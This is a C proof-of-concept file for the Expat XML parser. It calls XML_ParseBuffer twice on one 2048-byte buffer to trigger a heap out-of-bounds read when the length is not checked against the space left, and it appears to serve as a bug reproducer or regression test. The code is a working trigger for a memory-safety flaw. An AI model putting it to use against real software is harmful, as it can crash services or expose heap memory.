/* PoC: XML_ParseBuffer len vs. obtained buffer capacity (CWE-125 OOB read).
 *
 * Flow (public API only, mirroring the documented GetBuffer/ParseBuffer loop):
 *  1. XML_GetBuffer(parser, 2048) hands out the whole initial allocation
 *     (INIT_BUFFER_SIZE doubled once by the growth loop), i.e. 2048 bytes.
 *  2. Fill it completely with a prefix of an ordinary document:
 *     "<r>" followed by 2045 x 'a' (an unfinished text node).
 *  3. XML_ParseBuffer(parser, 2048, XML_FALSE) -- consumes "<r>", keeps the
 *     unterminated text run in the buffer (non-final buffer), so
 *     m_bufferPtr = buffer+3, m_bufferEnd = m_bufferLim = buffer+2048.
 *  4. XML_ParseBuffer(parser, 2048, XML_FALSE) again, without a fresh
 *     XML_GetBuffer in between: zero bytes are actually available past
 *     m_bufferEnd, but len is still <= the total buffer capacity.  If len is
 *     only validated against the whole allocation (and not against the space
 *     remaining past m_bufferEnd), m_bufferEnd += len pushes m_parseEndPtr
 *     past the allocation and the tokenizer scans the 'a' run straight off
 *     the end of the heap block.
 *
 * Expected: heap-buffer-overflow READ under AddressSanitizer when len is not
 * validated against the remaining buffer capacity; XML_STATUS_ERROR with
 * XML_ERROR_INVALID_ARGUMENT when it is.
 */
#include <stdio.h>
#include <string.h>

#include "expat.h"

int
main(void) {
  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL) {
    fprintf(stderr, "parser creation failed\n");
    return 1;
  }

  char *const buffer = XML_GetBuffer(parser, 2048);
  if (buffer == NULL) {
    fprintf(stderr, "XML_GetBuffer failed: %s\n",
            XML_ErrorString(XML_GetErrorCode(parser)));
    XML_ParserFree(parser);
    return 1;
  }

  buffer[0] = '<';
  buffer[1] = 'r';
  buffer[2] = '>';
  memset(buffer + 3, 'a', 2048 - 3);

  if (XML_ParseBuffer(parser, 2048, XML_FALSE) != XML_STATUS_OK) {
    fprintf(stderr, "first XML_ParseBuffer failed: %s\n",
            XML_ErrorString(XML_GetErrorCode(parser)));
    XML_ParserFree(parser);
    return 1;
  }

  const enum XML_Status status = XML_ParseBuffer(parser, 2048, XML_FALSE);
  if (status != XML_STATUS_OK) {
    /* Rejected -- len was validated against remaining capacity. */
    fprintf(stderr, "second XML_ParseBuffer rejected: %s\n",
            XML_ErrorString(XML_GetErrorCode(parser)));
    XML_ParserFree(parser);
    return 0;
  }

  XML_ParserFree(parser);
  return 0;
}
